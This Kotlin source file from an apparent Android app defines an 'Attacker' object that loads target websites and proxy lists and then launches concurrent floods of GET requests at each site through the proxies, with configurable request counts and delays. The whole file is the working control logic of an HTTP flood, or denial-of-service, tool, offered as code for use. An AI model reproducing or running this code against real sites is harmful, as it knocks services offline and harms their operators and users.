package com.defense.attack

import android.util.Log
import com.defense.attack.model.entity.data.AttackConfig
import com.defense.attack.model.entity.data.RequestMethod
import com.defense.attack.model.entity.data.RequestResponse
import com.defense.attack.model.entity.data.WebsiteAndProxies
import com.defense.attack.model.entity.data.proxy.ProxyInfo
import com.defense.attack.model.entity.data.website.Website
import com.defense.attack.model.usecase.AttackUseCase
import com.defense.attack.model.usecase.WebsitesAndProxiesGetUseCase
import io.github.bodiart.utils.util.extensions.process
import kotlinx.coroutines.*

object Attacker {
    private val tag = Attacker::class.java.simpleName

    private var attackJob: Job? = null

    private var websitesAndProxies: List<WebsiteAndProxies> = listOf()

    var websitesGetFailedCallback: (Throwable) -> Unit = {}
    var websitesEmptyCallback: () -> Unit = {}

    var handleRequestResponseCallback: (RequestResponse) -> Unit = {}
    var handleRequestErrorCallback: (Throwable) -> Unit = {}

    fun startAttack(
        coroutineScope: CoroutineScope,
        asyncRequestCount: Int,
        delayBetweenAllThreadsExecutedMillis: Long
    ): Job {
        return coroutineScope.launch {
            // setup websites and proxies
            setupWebsitesAndProxies()
            // start attack for websites
            websitesAndProxies.forEach { websiteAndProxies ->
                performAttackForWebsite(
                    websiteAndProxies.website,
                    websiteAndProxies.proxies,
                    asyncRequestCount,
                    delayBetweenAllThreadsExecutedMillis,
                    this
                )
            }

        }.apply { attackJob = this }
    }

    /**
     * Returns is success
     */
    private suspend fun setupWebsitesAndProxies(): Boolean = withContext(Dispatchers.IO) {
        if (!handleWebsitesAndProxies(WebsitesAndProxiesGetUseCase().perform())) {
            return@withContext false
        }

        // remove website if proxies list is empty
        websitesAndProxies = ArrayList(websitesAndProxies).apply {
            removeIf { it.proxies.isEmpty() }
        }

        // check is websites empty
        if (websitesAndProxies.isEmpty()) {
            websitesEmptyCallback()
            return@withContext false
        }

        true
    }

    private fun handleWebsitesAndProxies(websitesResult: Result<List<WebsiteAndProxies>>): Boolean {
        websitesResult.process(
            {
                websitesAndProxies = it
            },
            {
                websitesGetFailedCallback(it)
            }
        )
        return websitesResult.isSuccess
    }

    private fun performAttackForWebsite(
        website: Website,
        proxies: List<ProxyInfo>,
        asyncRequestCount: Int,
        delayBetweenAllThreadsExecutedMillis: Long,
        coroutineScope: CoroutineScope
    ): Job {
        return AttackUseCase().perform(
            coroutineScope,
            AttackConfig(
                website.url,
                RequestMethod.GET,
                mapOf(),
                null,
                null,
                delayBetweenAllThreadsExecutedMillis,
                proxies
            ),
            asyncRequestCount,
            {
                handleRequestResponseCallback(it)
                Log.d(tag, "request succeed code=${it.code} url=${website.url} proxy=${it.proxy?.url}:${it.proxy?.port}")
            },
            { throwable, proxy ->
                handleRequestErrorCallback(throwable)
                Log.d(tag, "request failed code=${throwable.message} url=${website.url} proxy=${proxy?.url}:${proxy?.port}")
            }
        )
    }

}